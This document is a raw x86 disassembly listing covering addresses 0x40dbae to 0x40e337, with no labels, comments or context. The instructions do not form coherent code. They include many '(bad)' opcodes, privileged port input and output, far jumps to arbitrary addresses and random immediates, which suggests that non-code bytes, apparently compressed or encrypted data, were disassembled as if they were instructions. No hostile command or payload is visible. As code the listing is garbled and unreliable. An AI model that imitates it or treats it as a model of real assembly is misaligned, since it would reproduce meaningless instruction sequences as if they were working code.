  40dbae:	push   edi
  40dbaf:	add    DWORD PTR [ebx+0x778a5c71],eax
  40dbb5:	mov    esp,DWORD PTR [ebx+0x40]
  40dbb8:	jnp    0x40dc36
  40dbba:	nop
  40dbbb:	scas   al,BYTE PTR es:[edi]
  40dbbc:	sub    al,0xf5
  40dbbe:	ins    DWORD PTR es:[edi],dx
  40dbbf:	fild   WORD PTR [esi-0x7c0db496]
  40dbc5:	mov    dl,0x21
  40dbc7:	or     BYTE PTR [eax+edx*8+0x4a3e41ed],0xc
  40dbcf:	cdq    
  40dbd0:	inc    ecx
  40dbd1:	dec    ecx
  40dbd2:	xchg   BYTE PTR [esi],ch
  40dbd4:	add    esp,DWORD PTR [esi-0x189d0590]
  40dbda:	push   eax
  40dbdb:	lods   al,BYTE PTR ds:[esi]
  40dbdc:	push   ebp
  40dbdd:	gs repnz scas eax,DWORD PTR es:[edi]
  40dbe0:	out    0xae,eax
  40dbe2:	dec    esp
  40dbe3:	mov    ss,WORD PTR [ebx+ebp*2-0x4d]
  40dbe7:	mov    ebx,DWORD PTR [edi+ecx*8]
  40dbea:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbec:	xor    al,0x18
  40dbee:	xchg   dh,bl
  40dbf0:	std    
  40dbf1:	push   es
  40dbf2:	stos   BYTE PTR es:[edi],al
  40dbf3:	aam    0xa8
  40dbf5:	clc    
  40dbf6:	or     eax,0xd7e40a09
  40dbfb:	sahf   
  40dbfc:	ins    BYTE PTR es:[edi],dx
  40dbfd:	dec    esp
  40dbfe:	out    dx,eax
  40dbff:	sbb    eax,0xd1325c4
  40dc04:	fstp   DWORD PTR [edi+0x32]
  40dc07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc08:	mov    esi,0x1cce8571
  40dc0d:	clc    
  40dc0e:	push   edi
  40dc0f:	aas    
  40dc10:	dec    esp
  40dc11:	outs   dx,DWORD PTR ds:[esi]
  40dc12:	arpl   cx,di
  40dc14:	test   eax,0x4960684f
  40dc19:	fxch   st(3)
  40dc1b:	xor    bh,ah
  40dc1d:	arpl   WORD PTR [esi],bp
  40dc1f:	lock int 0x82
  40dc22:	mov    ah,0xe1
  40dc24:	and    ebp,DWORD PTR [esi]
  40dc26:	push   ebx
  40dc27:	mov    ecx,0x1879a627
  40dc2c:	shl    DWORD PTR [edi-0x34],1
  40dc2f:	fstp   QWORD PTR [ecx+0x41fed8e3]
  40dc35:	mov    dl,0xab
  40dc37:	repz retf 0xec54
  40dc3b:	add    edx,DWORD PTR [eax+ebx*1+0x18e186c5]
  40dc42:	outs   dx,BYTE PTR ds:[esi]
  40dc43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc44:	pop    edi
  40dc45:	or     bl,BYTE PTR [esi+0x61694eb6]
  40dc4b:	push   esp
  40dc4c:	pop    edx
  40dc4d:	sahf   
  40dc4e:	sahf   
  40dc4f:	imul   esi,ebx,0xffffffbc
  40dc52:	jno    0x40dc1b
  40dc54:	mov    esi,0x7aeaaab3
  40dc59:	xor    eax,0xa04a2bd1
  40dc5e:	bound  esi,QWORD PTR [eax+0x2611ea2e]
  40dc64:	push   cs
  40dc65:	xor    al,bh
  40dc67:	fs into 
  40dc69:	push   ds
  40dc6a:	sub    DWORD PTR [esi+0x7da9ae0b],esp
  40dc70:	fidiv  WORD PTR [eax+0x3f2871b2]
  40dc76:	outs   dx,BYTE PTR ds:[esi]
  40dc77:	and    ah,dh
  40dc79:	and    DWORD PTR [eiz*4+0x6fecac15],ebp
  40dc80:	ds test al,0xc9
  40dc83:	push   cs
  40dc84:	add    BYTE PTR es:[esi+0x558d1e6],0x8e
  40dc8c:	(bad)  
  40dc8d:	bsr    ebx,ebp
  40dc90:	cs xor al,0x28
  40dc93:	les    ebx,FWORD PTR [eax]
  40dc95:	inc    esp
  40dc96:	add    DWORD PTR [eax-0x4441f8ad],esi
  40dc9c:	push   edi
  40dc9d:	(bad)  ds:0xb296fa43
  40dca3:	paddsb mm0,mm2
  40dca6:	xchg   ebx,eax
  40dca7:	push   cs
  40dca8:	icebp  
  40dca9:	cli    
  40dcaa:	and    al,BYTE PTR [ecx-0x1a]
  40dcad:	or     ebp,edi
  40dcaf:	xchg   esi,edi
  40dcb1:	pop    ebp
  40dcb2:	xchg   eax,eax
  40dcb4:	mov    ds:0x51247283,al
  40dcb9:	call   0x45bf677c
  40dcbe:	mov    al,0xb8
  40dcc0:	out    dx,eax
  40dcc1:	inc    ebx
  40dcc2:	mov    dh,0x86
  40dcc4:	mov    cl,0x44
  40dcc6:	cmp    eax,DWORD PTR [edi-0x6e]
  40dcc9:	lahf   
  40dcca:	xchg   ebp,eax
  40dccb:	in     al,0x12
  40dccd:	jae    0x40dd03
  40dccf:	(bad)  
  40dcd0:	(bad)  
  40dcd2:	push   edx
  40dcd3:	add    al,0x6
  40dcd5:	pop    ecx
  40dcd6:	mov    DWORD PTR [ecx-0x41],ebp
  40dcd9:	pop    ss
  40dcda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcdb:	xor    BYTE PTR [edx+0x55ee8a3],ch
  40dce1:	enter  0x4f1e,0x88
  40dce5:	jmp    0x492d:0xc80bd88c
  40dcec:	push   ebp
  40dced:	repnz xchg esp,eax
  40dcef:	mov    bl,0xd1
  40dcf1:	mov    ds:0x226d81e6,al
  40dcf6:	pop    eax
  40dcf7:	dec    edi
  40dcf8:	jl     0x40dcf5
  40dcfa:	ret    
  40dcfb:	push   es
  40dcfc:	or     eax,ebx
  40dcfe:	add    esp,DWORD PTR [bp+si]
  40dd01:	adc    edx,ecx
  40dd03:	jnp    0x40dd0f
  40dd05:	mov    ch,0x8d
  40dd07:	aas    
  40dd08:	mov    eax,0xcc382b62
  40dd0d:	dec    edi
  40dd0e:	push   ecx
  40dd0f:	not    BYTE PTR [ecx-0x4e]
  40dd12:	mov    edi,0x987911d8
  40dd17:	daa    
  40dd18:	sbb    eax,0x7dae75e0
  40dd1d:	(bad)  
  40dd1e:	arpl   WORD PTR [edx-0x44],di
  40dd21:	ins    DWORD PTR es:[edi],dx
  40dd22:	xchg   ecx,eax
  40dd23:	gs fwait
  40dd25:	lods   eax,DWORD PTR ds:[esi]
  40dd26:	cli    
  40dd27:	rol    DWORD PTR [edi+esi*4-0x12],cl
  40dd2b:	xchg   edx,eax
  40dd2c:	jb     0x40dd85
  40dd2e:	push   ecx
  40dd2f:	cmp    ch,BYTE PTR [edi]
  40dd31:	mov    cl,0xd3
  40dd33:	inc    edi
  40dd34:	dec    ebp
  40dd35:	ja     0x40dd2b
  40dd37:	mov    ebx,0x13eeed10
  40dd3c:	mov    DWORD PTR [edx-0x7fd02701],ecx
  40dd42:	frstor [edx+0xe1b16a2]
  40dd48:	mov    cl,0xbc
  40dd4a:	std    
  40dd4b:	es xor eax,0x7a42bc78
  40dd51:	test   al,0x4d
  40dd53:	imul   edi,DWORD PTR [ebx],0x5b
  40dd56:	imul   edx,ecx,0x5f34ec4c
  40dd5c:	stos   DWORD PTR es:[edi],eax
  40dd5d:	in     eax,0x64
  40dd5f:	and    esp,DWORD PTR [edx]
  40dd61:	mov    al,bh
  40dd63:	sub    eax,0x2ddaa1fc
  40dd68:	pop    esi
  40dd69:	lods   al,BYTE PTR ds:[esi]
  40dd6a:	jo     0x40dd9c
  40dd6c:	lock push ebx
  40dd6e:	fdiv   DWORD PTR [edi+0x1f1125b4]
  40dd74:	scas   eax,DWORD PTR es:[edi]
  40dd75:	xchg   edi,eax
  40dd76:	add    BYTE PTR [esi],ah
  40dd78:	xor    al,0x2c
  40dd7a:	or     ax,0x4f3b
  40dd7e:	cmp    esp,DWORD PTR [edx-0x709ca53a]
  40dd84:	dec    edx
  40dd85:	test   BYTE PTR [eax],al
  40dd87:	ins    DWORD PTR es:[edi],dx
  40dd88:	push   cs
  40dd89:	xchg   cl,dh
  40dd8b:	or     ebx,DWORD PTR [ebx+0x787149b6]
  40dd91:	loopne 0x40de06
  40dd93:	xor    eax,0xfbc84f89
  40dd98:	sbb    DWORD PTR [ebp+ecx*1+0x65],ebx
  40dd9c:	add    BYTE PTR [ecx+0x41764492],dl
  40dda2:	test   DWORD PTR [ebp+0x52],esp
  40dda5:	mov    cx,0xcf8d
  40dda9:	xchg   edx,eax
  40ddaa:	sub    BYTE PTR [edx-0x19313b4a],ah
  40ddb0:	xchg   BYTE PTR [ebp-0x32],dl
  40ddb3:	fstp   st(6)
  40ddb5:	xchg   ecx,eax
  40ddb6:	pop    es
  40ddb7:	jecxz  0x40dd98
  40ddb9:	mov    dl,0x1f
  40ddbb:	mov    ds:0xe69aae40,eax
  40ddc0:	imul   esp,ebp,0x69cbbc0
  40ddc6:	sbb    eax,0xbc6c0aa7
  40ddcb:	jnp    0x40ddc4
  40ddcd:	in     al,dx
  40ddce:	push   0xfffffff6
  40ddd0:	inc    esp
  40ddd1:	push   cs
  40ddd2:	jg     0x40de15
  40ddd4:	iret   
  40ddd5:	adc    al,0xbb
  40ddd7:	scas   eax,DWORD PTR es:[edi]
  40ddd8:	mov    eax,0x21c89287
  40dddd:	sub    DWORD PTR [ebp-0x63],esp
  40dde0:	ins    BYTE PTR es:[edi],dx
  40dde1:	or     al,0x48
  40dde3:	xor    eax,0x8ad296d9
  40dde8:	cmp    ch,BYTE PTR [ecx-0x77ef94f]
  40ddee:	push   ecx
  40ddf0:	mov    edi,0x503f9cd5
  40ddf5:	add    esp,DWORD PTR [eax-0x932577a]
  40ddfb:	xchg   ecx,eax
  40ddfc:	sub    al,dh
  40ddfe:	xchg   esi,eax
  40ddff:	xchg   ebp,eax
  40de00:	test   eax,0x15638b89
  40de05:	pop    ds
  40de06:	into   
  40de07:	pop    ss
  40de08:	(bad)  
  40de09:	cmp    BYTE PTR [ecx-0x44],cl
  40de0c:	pop    eax
  40de0d:	fstp   DWORD PTR [ebx]
  40de0f:	cmp    ecx,DWORD PTR [eax+0x53]
  40de12:	mov    dl,0x99
  40de14:	test   BYTE PTR [ebp+0x42e6f9f7],dh
  40de1a:	sbb    al,al
  40de1c:	add    esi,esi
  40de1e:	xchg   DWORD PTR [esi+0x22],ebx
  40de21:	mov    bl,0x3a
  40de23:	adc    eax,0x5e939e3b
  40de28:	(bad)  
  40de29:	cs cs call 0x18d73514
  40de30:	push   es
  40de31:	xor    ebp,esp
  40de33:	sbb    BYTE PTR [edi+0x58d7c3f3],dl
  40de39:	or     bl,BYTE PTR [edx]
  40de3b:	cmc    
  40de3c:	iret   
  40de3d:	fsub   DWORD PTR [ecx-0x2b]
  40de40:	pop    edx
  40de41:	cmp    al,0x55
  40de43:	xchg   esi,eax
  40de44:	jg     0x40de44
  40de46:	dec    edx
  40de47:	sti    
  40de48:	dec    eax
  40de49:	jnp    0x40ddd6
  40de4b:	inc    ebx
  40de4c:	es inc esp
  40de4e:	pop    es
  40de4f:	addr16 aas 
  40de51:	popa   
  40de52:	inc    ebp
  40de53:	test   eax,esi
  40de55:	outs   dx,DWORD PTR ds:[esi]
  40de56:	out    dx,eax
  40de57:	xchg   ecx,eax
  40de58:	test   DWORD PTR [ecx+0x4f07947e],eax
  40de5e:	int    0x14
  40de60:	in     al,0x44
  40de62:	stos   BYTE PTR es:[edi],al
  40de63:	pop    es
  40de64:	mov    ecx,0xedaf264a
  40de69:	xchg   esp,eax
  40de6a:	and    eax,0x24d8433e
  40de6f:	or     DWORD PTR ds:0x66fe1812,esi
  40de75:	iret   
  40de76:	jge    0x40de1b
  40de78:	test   BYTE PTR [ebx],bh
  40de7a:	inc    ebp
  40de7b:	inc    DWORD PTR [edi+edx*4]
  40de7e:	jnp    0x40dec2
  40de80:	cmp    eax,0xc18aa780
  40de85:	je     0x40deef
  40de87:	das    
  40de88:	mov    edi,ebp
  40de8a:	out    dx,eax
  40de8b:	int    0x4f
  40de8d:	or     eax,0xb2879875
  40de92:	push   ecx
  40de93:	sbb    ah,BYTE PTR [edx]
  40de95:	ja     0x40debb
  40de97:	fcmovb st,st(0)
  40de99:	in     eax,0x41
  40de9b:	imul   ebp
  40de9d:	retf   0xdcfc
  40dea0:	mov    dh,0x68
  40dea3:	into   
  40dea4:	not    DWORD PTR [ecx-0x38]
  40dea7:	mov    bl,dl
  40dea9:	or     eax,0x103e6282
  40deae:	dec    ebp
  40deaf:	jle    0x40de36
  40deb1:	mov    esp,0xf8ce6030
  40deb6:	dec    ebp
  40deb7:	retf   0x6c5b
  40deba:	inc    esp
  40debb:	sar    edx,cl
  40debd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40debe:	mov    ah,0xbe
  40dec0:	es jge 0x40de7c
  40dec3:	out    0xe0,al
  40dec5:	jecxz  0x40dee6
  40dec7:	les    esp,FWORD PTR [edi+eax*4]
  40deca:	adc    eax,0xa6bcaf69
  40decf:	lahf   
  40ded0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ded1:	mov    edi,esp
  40ded3:	lea    ebx,[ecx-0x78fb69bb]
  40ded9:	test   al,0x61
  40dedb:	inc    ecx
  40dedc:	push   esp
  40dedd:	mov    edx,0x3ff1186
  40dee2:	jg     0x40df29
  40dee4:	enter  0xb632,0xc4
  40dee8:	push   ss
  40dee9:	xchg   BYTE PTR [edx+0x27],cl
  40deec:	mov    ecx,0xdf855438
  40def1:	push   esp
  40def2:	add    dl,BYTE PTR [bp+di]
  40def5:	fadd   DWORD PTR [edi+esi*2]
  40def8:	add    DWORD PTR [ecx-0x32],esi
  40defb:	push   ebx
  40defc:	pop    ebx
  40defd:	test   esi,esp
  40deff:	or     DWORD PTR [edi],0x623b41a2
  40df05:	repz mov al,ah
  40df08:	mov    eax,0x1cdfbb3c
  40df0d:	mov    esi,0xd838b94f
  40df12:	jno    0x40df4e
  40df14:	mov    al,ds:0xdf18ed63
  40df19:	dec    edi
  40df1a:	xor    dl,BYTE PTR [edi+0x8fadd67]
  40df20:	inc    ebp
  40df21:	cmc    
  40df22:	or     DWORD PTR [ecx],esi
  40df24:	mov    dl,0xbf
  40df26:	clc    
  40df27:	sub    esp,0x4c
  40df2a:	fs int3 
  40df2c:	xor    BYTE PTR ds:0x368b50b6,bh
  40df32:	bound  edi,QWORD PTR [ecx-0x7e1dc332]
  40df38:	fnstenv [esi+0x69]
  40df3b:	adc    DWORD PTR [esi+esi*1+0x47],ebp
  40df3f:	mov    ecx,0x65f0fa64
  40df44:	cli    
  40df45:	adc    BYTE PTR [ebx+0x1480caa],dh
  40df4b:	cmc    
  40df4c:	or     DWORD PTR [esi-0x6a],edx
  40df4f:	adc    al,0xe7
  40df51:	mov    WORD PTR [ebx+0x5fa17d87],?
  40df57:	js     0x40df6f
  40df59:	adc    bh,BYTE PTR [esi+0x16]
  40df5c:	mov    al,0x3e
  40df5e:	add    al,0x93
  40df60:	(bad)  
  40df61:	fstp   TBYTE PTR [ebp+ecx*2-0x67]
  40df65:	mov    edx,0xfa3f100f
  40df6a:	or     al,0x39
  40df6c:	push   edi
  40df6d:	pop    edx
  40df6e:	outs   dx,DWORD PTR ds:[esi]
  40df6f:	sahf   
  40df70:	jno    0x40dfcd
  40df72:	or     BYTE PTR [edi+0x6129d85],0x2c
  40df79:	pop    esi
  40df7a:	mov    al,ds:0x2cdeba57
  40df7f:	xor    eax,0x5dd78eb2
  40df84:	in     al,0x83
  40df86:	and    DWORD PTR [ecx+0xf],0xffffffd3
  40df8a:	cs pop ds
  40df8c:	adc    al,0xfa
  40df8e:	scas   al,BYTE PTR es:[edi]
  40df8f:	shr    BYTE PTR [eax+0x164ccaae],cl
  40df95:	push   cs
  40df96:	pop    es
  40df97:	or     eax,0x3164bd34
  40df9c:	loopne 0x40df64
  40df9e:	add    ah,BYTE PTR [esi]
  40dfa0:	mov    edx,0x24a4084a
  40dfa5:	loopne 0x40e019
  40dfa7:	and    BYTE PTR [edx-0x6a4eb02d],dl
  40dfad:	sub    al,0xf6
  40dfaf:	xchg   bl,al
  40dfb1:	cld    
  40dfb2:	mov    dl,0xfe
  40dfb4:	mov    eax,0x30ec7a56
  40dfb9:	and    BYTE PTR [edx+0x9],ch
  40dfbc:	ror    DWORD PTR [si+0x1],1
  40dfc0:	inc    esp
  40dfc1:	sub    DWORD PTR [edi-0x5c34709c],0x75
  40dfc8:	mov    ah,0x5f
  40dfca:	push   ebp
  40dfcb:	xor    al,0x6d
  40dfcd:	sbb    eax,0x1701c6dd
  40dfd2:	adc    BYTE PTR [ebp-0x41cabc66],cl
  40dfd8:	dec    ecx
  40dfd9:	fcom   QWORD PTR [esi]
  40dfdb:	jbe    0x40dfee
  40dfdd:	popf   
  40dfde:	loop   0x40dfe1
  40dfe0:	xor    ah,cl
  40dfe2:	in     eax,0x5b
  40dfe4:	mov    eax,ds:0x758f952
  40dfea:	sbb    ecx,ecx
  40dfec:	icebp  
  40dfed:	stos   BYTE PTR es:[edi],al
  40dfee:	add    eax,0x8a1cffdc
  40dff3:	jne    0x40df96
  40dff5:	mov    bl,0x4a
  40dff7:	fimul  DWORD PTR [edi]
  40dff9:	mov    ch,0x91
  40dffb:	mov    esp,0x49c2e038
  40e000:	push   ebx
  40e001:	lds    ebp,FWORD PTR [ebx+0x22]
  40e004:	rcl    BYTE PTR [ecx-0x1f],cl
  40e007:	mov    dh,0xb0
  40e009:	xlat   BYTE PTR ds:[ebx]
  40e00a:	inc    edx
  40e00b:	dec    ebx
  40e00c:	out    0x2c,al
  40e00e:	in     al,dx
  40e00f:	arpl   WORD PTR [esi],di
  40e011:	out    dx,al
  40e012:	(bad)  
  40e013:	sbb    BYTE PTR [ebx+0x23],dl
  40e016:	retf   
  40e017:	jns    0x40e080
  40e019:	xchg   ecx,eax
  40e01a:	ss mov bl,bl
  40e01d:	cmp    edx,ebx
  40e01f:	imul   ecx,eax,0xffffffe2
  40e022:	xchg   ecx,eax
  40e023:	mov    ch,0x68
  40e025:	fucomip st,st(6)
  40e027:	xchg   edi,eax
  40e028:	mov    BYTE PTR [ebp-0x35],ch
  40e02b:	int3   
  40e02c:	shl    DWORD PTR [ecx*8-0x36fe88da],1
  40e033:	jb     0x40e004
  40e035:	mov    dl,0x45
  40e037:	jecxz  0x40e062
  40e039:	retf   
  40e03a:	mov    al,0xb7
  40e03c:	aam    0xd9
  40e03e:	add    BYTE PTR [edx+0x42dea8bd],bh
  40e044:	mov    dl,0x22
  40e046:	cld    
  40e047:	(bad)  
  40e048:	je     0x40e032
  40e04a:	les    eax,FWORD PTR fs:[edi-0x32]
  40e04e:	adc    BYTE PTR [edx-0x22],bh
  40e051:	dec    BYTE PTR [ebp+0x7afb05c8]
  40e057:	(bad)  
  40e058:	test   BYTE PTR [esi],0xdf
  40e05b:	stc    
  40e05c:	jmp    DWORD PTR [ecx+0x72171a89]
  40e062:	pushf  
  40e063:	and    DWORD PTR [ebx],0xffffffdf
  40e066:	push   edx
  40e067:	punpckhbw mm2,mm1
  40e06a:	sub    eax,0x6b2ad4ec
  40e06f:	fdivr  DWORD PTR [ebp-0x1f97c40e]
  40e075:	iret   
  40e076:	push   ecx
  40e077:	mov    edi,0x67aca060
  40e07d:	ss inc edx
  40e07f:	dec    edi
  40e080:	xchg   ebx,eax
  40e081:	push   cs
  40e082:	cmp    ecx,esi
  40e084:	imul   eax,DWORD PTR [edx-0xa5d0f86],0x1
  40e08b:	jp     0x40e0e3
  40e08d:	arpl   WORD PTR [ebp+ebx*4-0x624b6b9f],si
  40e094:	popf   
  40e095:	sub    al,0x77
  40e097:	jle    0x40e051
  40e099:	movlhps xmm2,xmm0
  40e09c:	pop    ebx
  40e09d:	mov    WORD PTR [eax+0x4315d6f5],?
  40e0a3:	inc    edi
  40e0a4:	jmp    0x40e0bc
  40e0a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0a7:	ret    0xed05
  40e0aa:	dec    ebp
  40e0ab:	xchg   ebp,eax
  40e0ac:	mov    al,0x48
  40e0ae:	adc    dh,0x97
  40e0b1:	rol    DWORD PTR [ecx-0x35],0x5f
  40e0b5:	xor    al,0xd7
  40e0b7:	mov    ah,0xe3
  40e0b9:	inc    esi
  40e0ba:	in     al,dx
  40e0bb:	mov    ecx,0x969af87
  40e0c0:	gs call 0x70f1e009
  40e0c6:	and    esp,DWORD PTR ds:0x582f84b5
  40e0cc:	dec    edx
  40e0cd:	pop    es
  40e0ce:	fstp   QWORD PTR [eax+0x4c]
  40e0d1:	js     0x40e090
  40e0d3:	inc    edi
  40e0d4:	add    cl,BYTE PTR [ecx-0x1d]
  40e0d7:	enter  0x7999,0x14
  40e0db:	mov    ds:0x60e1c78,al
  40e0e0:	lahf   
  40e0e1:	mov    eax,ds:0x8b06a957
  40e0e6:	jg     0x40e0e2
  40e0e8:	jbe    0x40e15e
  40e0ea:	fild   DWORD PTR [ecx+eiz*8-0x15ba63a1]
  40e0f1:	add    eax,0x96999a2c
  40e0f6:	and    al,0x14
  40e0f8:	push   es
  40e0f9:	cld    
  40e0fa:	lahf   
  40e0fb:	xor    eax,0x768f15fa
  40e100:	stos   DWORD PTR es:[edi],eax
  40e101:	test   al,0x9a
  40e103:	sti    
  40e104:	lods   al,BYTE PTR ds:[esi]
  40e105:	mov    BYTE PTR [ebp+0x3a4bd709],dh
  40e10b:	and    BYTE PTR [ebx-0x57],ch
  40e10e:	pop    eax
  40e10f:	push   0xffffff90
  40e111:	in     al,0xa7
  40e113:	aaa    
  40e114:	push   cs
  40e115:	shl    BYTE PTR [ebx-0x42],cl
  40e118:	mov    DWORD PTR [eax+0x6ceed06f],esi
  40e11e:	dec    esi
  40e11f:	or     DWORD PTR [ebx-0x7c],esp
  40e122:	sbb    BYTE PTR [ecx+0x63],ch
  40e125:	push   edi
  40e126:	fdivr  QWORD PTR [ebx+0x4a]
  40e129:	lods   eax,DWORD PTR ds:[esi]
  40e12a:	pusha  
  40e12b:	ja     0x40e14e
  40e12d:	mov    cl,0x4e
  40e12f:	jb     0x40e1aa
  40e131:	jae    0x40e138
  40e133:	jmp    0xfa329ef0
  40e138:	mov    edi,0x337a5a82
  40e13d:	jae    0x40e15f
  40e13f:	push   ss
  40e140:	inc    esi
  40e141:	mov    al,ds:0x91d02b6
  40e146:	lods   al,BYTE PTR ds:[esi]
  40e147:	jno    0x40e1b1
  40e149:	push   ds
  40e14a:	adc    dh,BYTE PTR [ebx]
  40e14c:	cmp    eax,0x61ef45f9
  40e151:	ins    BYTE PTR es:[edi],dx
  40e152:	out    dx,eax
  40e153:	mov    al,ds:0x7b872406
  40e158:	nop
  40e159:	mov    WORD PTR [ebp+0x11],?
  40e15c:	sub    eax,0xcde1412a
  40e161:	in     eax,dx
  40e162:	xchg   edx,eax
  40e163:	xchg   ebp,eax
  40e164:	mov    edi,edi
  40e166:	fs jnp 0x40e111
  40e169:	rcl    dl,0x2b
  40e16c:	or     esi,DWORD PTR [edx-0x59b191fc]
  40e172:	popa   
  40e173:	lds    eax,FWORD PTR [eax+edi*1+0x42203928]
  40e17a:	leave  
  40e17b:	or     DWORD PTR gs:[ebx-0x7382244a],ebp
  40e182:	call   0x9234d46b
  40e187:	aas    
  40e188:	push   0x99f7e253
  40e18d:	jo     0x40e18e
  40e18f:	aas    
  40e190:	xor    ecx,DWORD PTR [ebp-0xae0e670]
  40e196:	bound  edx,QWORD PTR [eax-0x34]
  40e199:	and    eax,DWORD PTR [ebx+0x46]
  40e19c:	ins    BYTE PTR es:[edi],dx
  40e19d:	or     BYTE PTR [esi-0x4667b32],cl
  40e1a3:	fisubr DWORD PTR [edi-0x55]
  40e1a6:	sar    BYTE PTR [eax],1
  40e1a8:	imul   ebp,DWORD PTR [edi],0x1b5ea91c
  40e1ae:	std    
  40e1af:	and    eax,0x297906c8
  40e1b4:	leave  
  40e1b5:	xor    al,0x94
  40e1b7:	cmp    al,0x46
  40e1b9:	dec    eax
  40e1ba:	xchg   edi,eax
  40e1bb:	jne    0x40e179
  40e1bd:	xor    eax,0x7b5ad253
  40e1c2:	gs or  eax,0xbb59fcc3
  40e1c8:	mov    edi,0x187b15ab
  40e1cd:	push   eax
  40e1ce:	stos   BYTE PTR es:[edi],al
  40e1cf:	mov    eax,ds:0xc4f0eb5c
  40e1d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1d5:	xchg   edx,eax
  40e1d6:	add    al,0xe9
  40e1d8:	inc    eax
  40e1d9:	dec    edi
  40e1da:	fmul   QWORD PTR [eax-0x1d5259d4]
  40e1e0:	shl    DWORD PTR [ecx],cl
  40e1e2:	cld    
  40e1e3:	pop    edi
  40e1e4:	aaa    
  40e1e5:	test   eax,0x27b14b9f
  40e1ea:	pushf  
  40e1eb:	fwait
  40e1ec:	xchg   edi,eax
  40e1ee:	popf   
  40e1ef:	push   ax
  40e1f1:	test   al,0xe9
  40e1f3:	pop    ds
  40e1f4:	daa    
  40e1f5:	push   ecx
  40e1f6:	pop    ss
  40e1f7:	rcl    BYTE PTR [ebp-0x2e],1
  40e1fa:	add    DWORD PTR [esi-0x74],edx
  40e1fd:	xchg   edi,eax
  40e1fe:	(bad)  
  40e1ff:	pop    edx
  40e200:	push   ecx
  40e201:	and    eax,0x7e40f18e
  40e206:	or     BYTE PTR [eax+0x73],ch
  40e209:	mov    ebx,0x49492cc2
  40e20e:	pop    ebx
  40e20f:	adc    al,0x31
  40e211:	in     eax,dx
  40e212:	dec    ecx
  40e213:	imul   sp,WORD PTR [ecx-0x7eeab2df],0x86a2
  40e21c:	fsubr  QWORD PTR ds:0x4350dc07
  40e222:	xor    BYTE PTR [esi+ebp*2-0x6c375a09],cl
  40e229:	xchg   DWORD PTR [ebx+edi*2-0x50],esi
  40e22d:	cmc    
  40e22e:	and    al,0xc1
  40e230:	cmp    eax,0x5a4334b9
  40e235:	mov    al,ds:0x6790d7b5
  40e23a:	jmp    0x40e26a
  40e23c:	mov    cl,0x45
  40e23e:	xchg   ecx,eax
  40e23f:	pmulhuw mm5,QWORD PTR [edx-0x47335ffe]
  40e246:	pop    esp
  40e247:	out    0xac,eax
  40e249:	pop    ebx
  40e24a:	push   ecx
  40e24b:	daa    
  40e24c:	ins    DWORD PTR es:[edi],dx
  40e24d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e24e:	sahf   
  40e24f:	pop    esp
  40e250:	shr    DWORD PTR [eax+0x24c17430],1
  40e256:	sahf   
  40e257:	and    DWORD PTR ds:0x230ba96a,0xa8b9cf57
  40e261:	mov    DWORD PTR [ebp-0x69448c2],eax
  40e267:	lods   al,BYTE PTR ds:[esi]
  40e268:	xor    BYTE PTR [ebx],0xce
  40e26b:	test   al,0x4b
  40e26d:	push   cs
  40e26e:	adc    dl,BYTE PTR [edx+0x4]
  40e271:	aaa    
  40e272:	mov    fs,ebp
  40e274:	adc    cl,ch
  40e276:	lds    esp,FWORD PTR [ebp-0x4a]
  40e279:	dec    edi
  40e27a:	mov    bl,0xfc
  40e27c:	div    BYTE PTR [edi-0x33]
  40e27f:	jae    0x40e27c
  40e281:	add    al,0x73
  40e283:	hlt    
  40e284:	lods   eax,DWORD PTR ds:[esi]
  40e285:	retf   
  40e286:	lea    edi,[ecx-0x1dace5c]
  40e28c:	push   ecx
  40e28d:	das    
  40e28e:	push   eax
  40e28f:	and    BYTE PTR [ecx+0x148a71e2],bh
  40e295:	sbb    eax,DWORD PTR [edi+0x4a]
  40e298:	mov    bl,0xd4
  40e29a:	xor    eax,eax
  40e29c:	mov    esi,DWORD PTR [eax+0x2c]
  40e29f:	sub    ebp,DWORD PTR [ebp-0x39]
  40e2a2:	fdiv   st(0),st
  40e2a4:	mov    eax,0x676936ce
  40e2a9:	mov    ecx,0xde0d733a
  40e2ae:	test   al,0x25
  40e2b0:	sbb    al,0x7e
  40e2b2:	pop    esp
  40e2b4:	sub    bh,BYTE PTR [ecx-0x57b1191c]
  40e2ba:	push   edi
  40e2bb:	fld    QWORD PTR [ebx-0x4fc9ffc]
  40e2c1:	(bad)  [ecx-0x61f0dc6c]
  40e2c7:	inc    esp
  40e2c8:	adc    eax,0x71af3178
  40e2cd:	push   0xa414ddd1
  40e2d2:	jle    0x40e27d
  40e2d4:	ins    BYTE PTR es:[edi],dx
  40e2d5:	(bad)  [eax+0x6]
  40e2d8:	sub    esi,DWORD PTR [edx-0x12]
  40e2db:	inc    ecx
  40e2dc:	push   edx
  40e2dd:	cmc    
  40e2de:	push   0x1a
  40e2e0:	push   ebp
  40e2e1:	test   eax,0xf7898b6
  40e2e6:	push   ebp
  40e2e7:	sub    esp,DWORD PTR [ecx+0x7649d4d5]
  40e2ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2ee:	rcl    DWORD PTR [edx],0x4f
  40e2f1:	inc    edx
  40e2f2:	or     BYTE PTR [ebx+0x779006e3],bl
  40e2f8:	and    esi,esi
  40e2fa:	outs   dx,BYTE PTR ds:[esi]
  40e2fb:	es adc eax,0x140f0b9c
  40e301:	mov    esp,ds
  40e303:	std    
  40e304:	and    DWORD PTR [edx+0x654cce87],ebx
  40e30a:	push   ebp
  40e30b:	xchg   ebp,eax
  40e30c:	test   BYTE PTR [ecx],cl
  40e30e:	mov    ebp,0x93c4658d
  40e313:	out    dx,eax
  40e314:	mov    esp,0x75b79f94
  40e319:	add    al,0x98
  40e31b:	scas   al,BYTE PTR es:[edi]
  40e31c:	fwait
  40e31d:	(bad)  
  40e31e:	and    al,0x4e
  40e320:	gs std 
  40e322:	dec    esi
  40e323:	adc    BYTE PTR [ebx-0x1c799bd0],al
  40e329:	add    BYTE PTR [esi-0x52],ch
  40e32c:	pop    ss
  40e32d:	lahf   
  40e32e:	dec    eax
  40e32f:	cdq    
  40e330:	jns    0x40e309
  40e332:	sbb    eax,0x985e9b46
  40e337:	jg     0xca521a6a
